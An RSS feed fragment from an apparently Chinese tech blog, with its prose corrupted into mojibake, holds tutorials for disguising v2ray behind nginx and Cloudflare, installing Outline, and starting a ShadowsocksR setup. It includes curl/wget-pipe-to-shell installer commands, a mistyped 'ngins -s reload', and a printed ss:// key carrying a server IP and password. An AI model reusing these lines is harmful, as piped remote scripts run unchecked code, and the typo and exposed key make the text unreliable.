&lt;p&gt;ç»è¿‡ä¸Šé¢çš„æ“ä½œï¼ŒCloudFlareé…ç½®å·²ç»å®Œæˆï¼Œæœ€ååœ¨é˜¿é‡Œäº‘åŸŸåä¸‹å°†å¯¹åº”åŸŸåçš„ DNS è§£æä¸º CloudFlare ä¸ºæˆ‘ä»¬åˆ†é…çš„ DNS è®°å½•ï¼Œç‚¹å‡»ç¡®å®šå³å¯&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/aliyun-edit-dns.png&quot; alt=&quot;aliyun-edit-dns&quot; /&gt;&lt;/p&gt;

&lt;p&gt;CDNå·²ç»é…ç½®å®Œæˆ&lt;/p&gt;

&lt;h3 id=&quot;36-é…ç½®v2ray&quot;&gt;3.6 é…ç½®v2ray&lt;/h3&gt;

&lt;p&gt;æˆ‘ä»¬ä¸Šé¢çš„æ“ä½œéƒ½ä¸v2rayæ²¡æœ‰ä»»ä½•å…³ç³»ï¼Œåªæ˜¯åˆ›å»ºäº†ä¸€ä¸ªæ™®é€šçš„HTTPSçš„é™æ€ç«™ç‚¹ï¼Œç°åœ¨æˆ‘ä»¬è¿™æ‰å¼€å§‹å°†å…¶å…³è”ã€‚&lt;/p&gt;

&lt;p&gt;ç¼–è¾‘&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/v2ray/config.json&lt;/code&gt;æ–‡ä»¶ä¿®æ”¹å’Œæ–°å¢å¦‚ä¸‹é…ç½®&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/v2ray-config-update.png&quot; alt=&quot;v2ray-config-update&quot; /&gt;&lt;/p&gt;

&lt;p&gt;è¿™é‡Œä¸ºä»€ä¹ˆæ”¹ç«¯å£ï¼Œä¹‹å‰çš„ç«¯å£å·²ç»é…ç½®åœ¨é˜²ç«å¢™çš„å‡ºå…¥ç«™è§„åˆ™ä¸­ï¼Œå¤–éƒ¨æ˜¯å¯ä»¥ç›´æ¥è®¿é—®ï¼Œåå‘ä»£ç†ä¸€ä¸ªé‡è¦çš„åŸåˆ™æ˜¯éšè—å†…éƒ¨åº”ç”¨ï¼Œç»Ÿä¸€å‡ºå…¥å£ï¼Œæ‰€ä»¥ç«¯å£åªéœ€è¦è®¾ç½®ä¸€ä¸ªä¸åœ¨é˜²ç«å¢™è§„åˆ™é‡Œçš„1024ï½65535ä¹‹é—´çš„å€¼å³å¯ã€‚&lt;/p&gt;

&lt;p&gt;é‡æ–°å¯åŠ¨v2rayå¹¶æŸ¥çœ‹å¯åŠ¨çŠ¶æ€&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl restart v2ray
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status v2ray
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä¸€åˆ‡æ­£å¸¸ï¼Œæ­å–œä½ ï¼Œä½ å·²ç»ä¸èƒ½ä½¿ç”¨ v2ray æœåŠ¡äº†ï¼Œå› ä¸ºç›®å‰ v2ray æœåŠ¡åªæ˜¯åœ¨æœåŠ¡å™¨å†…éƒ¨å¯åŠ¨ï¼Œå¹¶æ²¡æœ‰å¯¹å¤–å¼€æ”¾ï¼Œåªèƒ½æœåŠ¡å™¨å†…éƒ¨è®¿é—®ï¼Œå¦‚æœæš´éœ² v2ray æœåŠ¡ï¼Œè¿™æ˜¯ä¸‹ä¸€æ­¥åšçš„äº‹æƒ…ã€‚&lt;/p&gt;

&lt;h3 id=&quot;37-ä»£ç†è½¬å‘&quot;&gt;3.7 ä»£ç†è½¬å‘&lt;/h3&gt;

&lt;p&gt;ç¼–è¾‘nginxé…ç½®æ–‡ä»¶&lt;code class=&quot;highlighter-rouge&quot;&gt;vi /etc/nginx/sites-available/default&lt;/code&gt;ï¼Œå†…å®¹æœ‰äº›ä¹±ï¼Œæ˜¯å› ä¸ºåœ¨ä½¿ç”¨certbotç”ŸæˆHTTPSè¯ä¹¦æ—¶è‡ªåŠ¨æ”¹çš„ï¼Œä¸ç®¡ï¼Œç›´æ¥ä½¿ç”¨å¤åˆ¶ä¸‹é¢åœ¨nginxçš„é…ç½®ï¼Œé…ç½®v2rayçš„åå‘ä»£ç†ï¼Œæœ€ç»ˆç»“æœå¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;language-conf highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;server&lt;/span&gt; {
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; [::]:&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ipv6only&lt;/span&gt;=&lt;span class=&quot;n&quot;&gt;on&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;listen&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# è¿™é‡Œå¡«å†™è‡ªå·±çš„è¯ä¹¦è·¯å¾„
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;ssl_certificate&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;live&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;fullchain&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;ssl_certificate_key&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;live&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;privkey&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;
    
    &lt;span class=&quot;n&quot;&gt;include&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;options&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;conf&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;ssl_dhparam&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;etc&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;letsencrypt&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;ssl&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;dhparams&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;pem&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;root&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;var&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;www&lt;/span&gt;/&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;
    &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;htm&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;nginx&lt;/span&gt;-&lt;span class=&quot;n&quot;&gt;debian&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;html&lt;/span&gt;;

    &lt;span class=&quot;c&quot;&gt;# è¿™é‡Œå¡«å†™è‡ªå·±çš„åŸŸå
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;server_name&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;wangjun&lt;/span&gt;.&lt;span class=&quot;n&quot;&gt;bid&lt;/span&gt;;

    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; / {
        &lt;span class=&quot;n&quot;&gt;try_files&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;uri&lt;/span&gt;/ =&lt;span class=&quot;m&quot;&gt;404&lt;/span&gt;;
    }

    &lt;span class=&quot;c&quot;&gt;# ========== å¢åŠ çš„é…ç½® ========== 
&lt;/span&gt;    &lt;span class=&quot;c&quot;&gt;# è¯·æ±‚&quot;/ray&quot;ä¸v2rayé…ç½®é‡Œçš„wsSettingsä¸‹pathå¯¹é½
&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;location&lt;/span&gt; /&lt;span class=&quot;n&quot;&gt;ray&lt;/span&gt; {            
        &lt;span class=&quot;c&quot;&gt;# è½¬å‘åœ°å€ä¸v2rayé…ç½®é‡Œçš„listenå’Œportå¯¹é½
&lt;/span&gt;        &lt;span class=&quot;n&quot;&gt;proxy_pass&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;://&lt;span class=&quot;m&quot;&gt;127&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;:&lt;span class=&quot;m&quot;&gt;9001&lt;/span&gt;;

        &lt;span class=&quot;n&quot;&gt;proxy_redirect&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;off&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_http_version&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;.&lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Upgrade&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;http_upgrade&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Connection&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;upgrade&quot;&lt;/span&gt;;
        &lt;span class=&quot;n&quot;&gt;proxy_set_header&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Host&lt;/span&gt; $&lt;span class=&quot;n&quot;&gt;http_host&lt;/span&gt;;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;æ‰§è¡Œå‘½ä»¤è®©nginxé‡æ–°åŠ è½½é…ç½®æ–‡ä»¶ï¼Œæ²¡è¾“å‡ºè¡¨ç¤ºé…ç½®OK&lt;/p&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ngins &lt;span class=&quot;nt&quot;&gt;-s&lt;/span&gt; reload
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;è§£é‡Šä¸‹ä¸Šé¢çš„é…ç½®ï¼Œå½“ä½¿ç”¨â€https://åŸŸå/rayâ€è®¿é—®æ—¶ï¼Œnginxå°†æ‰€æœ‰è¯·æ±‚ä»£ç†è½¬å‘åˆ°å†…éƒ¨åº”ç”¨127.0.0.1:9001ä¸Šï¼Œè€Œè¿™ä¸ªå¯åŠ¨ç€9001ç«¯å£çš„å†…éƒ¨åº”ç”¨å°±æ˜¯v2rayæœåŠ¡ï¼Œè¿™æ ·å°±åƒæ­£å¸¸è®¿é—®æ™®é€šç«™ç‚¹ä¸€æ ·å®Œæˆæˆ‘ä»¬ä¼Ÿå¤§çš„å‡ºå›½æ—…è¡Œè®¡åˆ’ï¼Œå‡ºå…³è¢«æ£€æŸ¥æ—¶ï¼ŒGFè®¤ä¸ºè¯·æ±‚çš„æ˜¯æ­£å¸¸çš„ç½‘é¡µæœåŠ¡ä»è€Œè¾¾åˆ°ä¼ªè£…çš„ç›®çš„ï¼Œä¸‹é¢é…ç½®v2rayå®¢æˆ·ç«¯ã€‚&lt;/p&gt;

&lt;h3 id=&quot;38-é…ç½®è¿æ¥&quot;&gt;3.8 é…ç½®è¿æ¥&lt;/h3&gt;

&lt;p&gt;ä½¿ç”¨ä¼ªè£…æ¬ºéª—çš„æ–¹å¼æ—…è¡Œï¼Œå®¢æˆ·ç«¯ä¸Šçš„é…ç½®ä¸æ™®é€šçš„ç¨æœ‰åŒºåˆ«ï¼Œå…·ä½“å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;æ›´æ”¹Addresså’Œç«¯å£å·ï¼Œnetworkåè®®æ”¹æˆwsï¼Œå…¶ä»–ä¿æŒä¸å˜ï¼Œç„¶åç‚¹å‡»transport settingsæŒ‰é’®&lt;/li&gt;
  &lt;li&gt;pathå€¼æ”¹ä¸º/ray&lt;/li&gt;
  &lt;li&gt;å‹¾é€‰Use TLSï¼ŒTLS serverNameä½¿ç”¨é…ç½®çš„åŸŸå&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-1.png&quot; alt=&quot;v2ray-client-fake-1&quot; /&gt;
&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-2.png&quot; alt=&quot;v2ray-client-fake-2&quot; /&gt;
&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/v2ray-client-fake-3.png&quot; alt=&quot;v2ray-client-fake-3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;All done.&lt;/strong&gt; ç‚¹å‡»å®¢æˆ·ç«¯ä¸Šçš„load coreï¼Œâœˆï¸ å¼€å¯ä½ çš„ç¯æ¸¸ä¸–ç•Œä¹‹æ—…ã€‚&lt;/p&gt;

&lt;h2 id=&quot;å®Œæ•´çš„é…ç½®&quot;&gt;å®Œæ•´çš„é…ç½®&lt;/h2&gt;

&lt;p&gt;æœ€åå¥‰ä¸Šv2rayå’Œnginxå®Œæ•´çš„é…ç½®æ–‡ä»¶ï¼Œä»…ä¾›å‚è€ƒã€‚&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;nginxï¼Œ&lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/default_full&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;v2rayï¼Œ&lt;a href=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190606/config_full.json&quot;&gt;ç‚¹å‡»ä¸‹è½½&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>  
               <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/v2ray-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/v2ray-build/</guid>  
               </item>  
          
            <item>  
               <title>æ—…è¡Œå¿…å¤‡ Outline æ­å»ºä¸ä½¿ç”¨</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#1-ç®€ä»‹&quot; id=&quot;markdown-toc-1-ç®€ä»‹&quot;&gt;1. ç®€ä»‹&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-åˆ›å»ºå®ä¾‹&quot; id=&quot;markdown-toc-2-åˆ›å»ºå®ä¾‹&quot;&gt;2. åˆ›å»ºå®ä¾‹&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-ä¸€é”®å®‰è£…&quot; id=&quot;markdown-toc-3-ä¸€é”®å®‰è£…&quot;&gt;3. ä¸€é”®å®‰è£…&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-outline-manager&quot; id=&quot;markdown-toc-4-outline-manager&quot;&gt;4. outline manager&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-outline-client&quot; id=&quot;markdown-toc-5-outline-client&quot;&gt;5. outline client&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;1-ç®€ä»‹&quot;&gt;1. ç®€ä»‹&lt;/h2&gt;

&lt;p&gt;Outline åŸºäºssçš„å¼€æºè½¯ä»¶ï¼Œå‡ºè‡ªäºJigsawå…¬å¸ï¼ŒJigsawå…¬å¸å‰èº«æ˜¯Google Ideasï¼Œæ˜¯Googleæ——ä¸‹çš„æŠ€æœ¯å­µåŒ–å™¨å…¬å¸ï¼Œç›®æ ‡æ˜¯ä»¥æŠ€æœ¯æ¥å…‹æœå…¨çƒçš„ç½‘ç»œå®‰å…¨éš¾é¢˜ï¼Œ
åŒ…æ‹¬åœ°å€ç½‘ç»œå®¡æŸ¥åˆ¶åº¦ã€é™ä½ç½‘ç»œæ”»å‡»çš„å¨èƒï¼Œä»¥åŠé˜²æ­¢å¤§ä¼—æ”¶åˆ°ç½‘ç»œéªšæ‰°ç­‰ã€‚Outlineå³ä¸ºJigsawçš„æˆæœä¹‹ä¸€ã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-åˆ›å»ºå®ä¾‹&quot;&gt;2. åˆ›å»ºå®ä¾‹&lt;/h2&gt;

&lt;p&gt;å‚è€ƒ &lt;a href=&quot;//wangjun.dev/2019/06/ssr-build/&quot;&gt;æ—…è¡Œå¿…å¤‡ ShadowsocketR æ­å»ºä¸ä½¿ç”¨&lt;/a&gt; ä¸­çš„åˆ›å»ºå®ä¾‹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;3-ä¸€é”®å®‰è£…&quot;&gt;3. ä¸€é”®å®‰è£…&lt;/h2&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;curl &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; https://get.docker.com/ | sh
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl start docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl &lt;span class=&quot;nb&quot;&gt;enable &lt;/span&gt;docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;systemctl status docker
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;wget &lt;span class=&quot;nt&quot;&gt;-qO-&lt;/span&gt; https://raw.githubusercontent.com/Jigsaw-Code/outline-server/master/src/server_manager/install_scripts/install_server.sh | bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;ä»ä¸Šè¿°å‘½ä»¤å¯è§ outline çš„serverç¯å¢ƒæ˜¯åŸºäº docker æ¥åšçš„ï¼Œé¦–å…ˆå®‰è£… docker å®¹å™¨ï¼Œå¯åŠ¨ã€è®¾ç½®å¼€æœºè‡ªå¯åŠ¨ã€æŸ¥çœ‹å¯åŠ¨çŠ¶æ€ï¼Œæ‰§è¡Œä¸€é”®è„šæœ¬å®‰è£…ã€‚
æ‰§è¡Œå®Œåä¼šè¾“å‡ºä¸€æ®µ json æ ¼å¼çš„å†…å®¹ï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªè¿æ¥æœåŠ¡ç«¯çš„åŠ å¯†ä¸²ï¼Œå°†å®ƒå¤åˆ¶ä¿å­˜åˆ°è®°äº‹æœ¬ä¸­ï¼Œåç»­éœ€è¦ä½¿ç”¨ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-result.png&quot; alt=&quot;outline-result&quot; /&gt;&lt;/p&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ç«¯å£å·æ˜¯å¦åœ¨é˜²ç«å¢™è§„åˆ™ä¸­&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;4-outline-manager&quot;&gt;4. outline manager&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-manager.png&quot; alt=&quot;outline-manager&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ç‚¹å‡»ä¸‹è½½ &lt;a href=&quot;https://github.com/Jigsaw-Code/outline-server/releases&quot;&gt;outline manager&lt;/a&gt; å¹¶å®‰è£…ï¼Œå°†ä¸Šé¢è¾“å‡ºçš„ json åŠ å¯†ä¸²é…ç½®åœ¨ outline manager ä¸­ï¼Œ
å¯åŠ¨å¹¶ç‚¹å‡»é’¥åŒ™æŒ‰é’®è·å–è¿æ¥keyï¼Œç±»ä¼¼å¦‚ä¸‹ï¼š&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ss://Y2hhY2hhMjAtaWV0Zi1wb2x5MTMwNTpETVdTQUlSbFN6dWc=@34.92.208.222:54320/?outline=1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;5-outline-client&quot;&gt;5. outline client&lt;/h2&gt;

&lt;p&gt;ç‚¹å‡»ä¸‹è½½ &lt;a href=&quot;https://github.com/Jigsaw-Code/outline-client/releases&quot;&gt;outline client&lt;/a&gt;ï¼Œæ ¹æ®è‡ªå·±ç³»ç»Ÿè‡ªè¡ŒæŒ‰ç…§ï¼Œä½¿ç”¨ä¸Šä¸€æ­¥çš„keyæ·»åŠ è¿æ¥ï¼Œä¿å­˜å¹¶å¯åŠ¨å³å¯ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/outline-client.png&quot; alt=&quot;outline-client&quot; /&gt;&lt;/p&gt;

</description>  
               <pubDate>Thu, 06 Jun 2019 00:00:00 +0800</pubDate>  
               <link>http://localhost:4000/2019/06/outline-build/</link>  
               <guid isPermaLink="true">http://localhost:4000/2019/06/outline-build/</guid>  
               </item>  
          
            <item>  
               <title>æ—…è¡Œå¿…å¤‡ ShadowsocketR æ­å»ºä¸ä½¿ç”¨</title>  
               <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#è°¨æ­¤è¯´æ˜&quot; id=&quot;markdown-toc-è°¨æ­¤è¯´æ˜&quot;&gt;è°¨æ­¤è¯´æ˜&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#1-ç¯å¢ƒå‡†å¤‡&quot; id=&quot;markdown-toc-1-ç¯å¢ƒå‡†å¤‡&quot;&gt;1. ç¯å¢ƒå‡†å¤‡&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#2-åˆ›å»ºå®ä¾‹&quot; id=&quot;markdown-toc-2-åˆ›å»ºå®ä¾‹&quot;&gt;2. åˆ›å»ºå®ä¾‹&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#3-æ‰§è¡Œå®‰è£…&quot; id=&quot;markdown-toc-3-æ‰§è¡Œå®‰è£…&quot;&gt;3. æ‰§è¡Œå®‰è£…&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#4-é…ç½®é˜²ç«å¢™&quot; id=&quot;markdown-toc-4-é…ç½®é˜²ç«å¢™&quot;&gt;4. é…ç½®é˜²ç«å¢™&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#5-å®¢æˆ·ç«¯é“¾æ¥&quot; id=&quot;markdown-toc-5-å®¢æˆ·ç«¯é“¾æ¥&quot;&gt;5. å®¢æˆ·ç«¯é“¾æ¥&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;è°¨æ­¤è¯´æ˜&quot;&gt;è°¨æ­¤è¯´æ˜&lt;/h2&gt;

&lt;p&gt;ç›®å‰ github ä¸Šçš„ shadowsocketR ä½œè€…å‡ºäºæŸäº›å¤§å®¶éƒ½çŸ¥é“çš„åŸå› æ—©å·²ä¸åœ¨æ›´æ–°ï¼Œç¨³å®šç‰ˆæœ¬ä¿æŒåœ¨3.2.2ä¸Šï¼Œä¸ºäº†ä¿è¯åç»­æ­£å¸¸ä½¿ç”¨ï¼Œå·²ç»fockåˆ°è‡ªå·±çš„ä»“åº“ä¸­ï¼Œ
ä¸€é”®å®‰è£…è„šæœ¬ä¹Ÿç‹¬ç«‹åœ¨è‡ªå·±çš„ github ä¸­è¿›è¡Œç»´æŠ¤ã€‚&lt;/p&gt;

&lt;h2 id=&quot;1-ç¯å¢ƒå‡†å¤‡&quot;&gt;1. ç¯å¢ƒå‡†å¤‡&lt;/h2&gt;

&lt;p&gt;å¯ä»¥é€‰æ‹©çš„æœåŠ¡å™¨ç¯å¢ƒå¾ˆå¤šï¼Œæ¨èä½¿ç”¨ &lt;a href=&quot;https://www.vultr.com/?ref=7472300&quot;&gt;vultr&lt;/a&gt; å’Œ &lt;a href=&quot;https://cloud.google.com/&quot;&gt;google cloud&lt;/a&gt;ï¼Œè¿™é‡Œ
ä½¿ç”¨ google äº‘ä¸ºä¾‹ã€‚&lt;/p&gt;

&lt;h2 id=&quot;2-åˆ›å»ºå®ä¾‹&quot;&gt;2. åˆ›å»ºå®ä¾‹&lt;/h2&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/create-vm.png&quot; alt=&quot;create-vm&quot; /&gt;&lt;/p&gt;

&lt;p&gt;é…ç½®è¯´æ˜ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;åç§°&lt;/strong&gt;ï¼Œéšæ„ï¼Œèµ·ä¸€ä¸ªè‡ªå®šä¹‰çš„&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;åŒºåŸŸ&lt;/strong&gt;ï¼Œå°±è¿‘åŸåˆ™ï¼Œäºšæ´²çš„éƒ½å¯ï¼Œè¿™é‡Œé€‰æ‹©é¦™æ¸¯-åŒºåŸŸc&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;æœºå™¨ç±»å‹&lt;/strong&gt;ï¼Œæœ€å°é…ç½®ï¼Œå¾®å‹å…±äº«CPU&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;å¯åŠ¨ç£ç›˜&lt;/strong&gt;ï¼Œé»˜è®¤debian9&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;é˜²ç«å¢™&lt;/strong&gt;ï¼Œå…¨éƒ¨å‹¾é€‰&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å…¶ä»–ä¿æŒé»˜è®¤ï¼Œç‚¹å‡»åˆ›å»º&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/create-vm-result.png&quot; alt=&quot;create-vm-result&quot; /&gt;&lt;/p&gt;

&lt;p&gt;åˆ›å»ºå®Œæˆåï¼Œè®°ä½åˆ†é…çš„å…¬ç½‘IPï¼Œæµ‹è¯•ä¸‹è¿™ä¸ªIPçš„å»¶æ—¶ä»¥å†³å®šæ˜¯å¦ç”¨æ­¤å®ä¾‹ï¼ˆæ­¤æ­¥éª¤å¯é€‰ï¼‰ã€‚æµè§ˆå™¨æ‰“å¼€ &lt;a href=&quot;https://tools.ipip.net/traceroute.php&quot;&gt;ipip.net&lt;/a&gt;ï¼Œ
è¾“å…¥å½“å‰çš„å¸¦å®½è·¯å¾„å’Œåˆšæ‰åˆ†é…çš„å…¬ç½‘IPï¼Œç‚¹å‡»æŸ¥çœ‹å»¶æ—¶æ€§ï¼ŒåŸºæœ¬ä¸Šé«˜äº100mså¯ä»¥é€‰æ‹©ä¸è¦é‡æ–°åˆ›å»ºå®ä¾‹ã€‚&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;//vinnycc.oss-cn-shanghai.aliyuncs.com/20190605/check-ip.png&quot; alt=&quot;check-ip&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;3-æ‰§è¡Œå®‰è£…&quot;&gt;3. æ‰§è¡Œå®‰è£…&lt;/h2&gt;

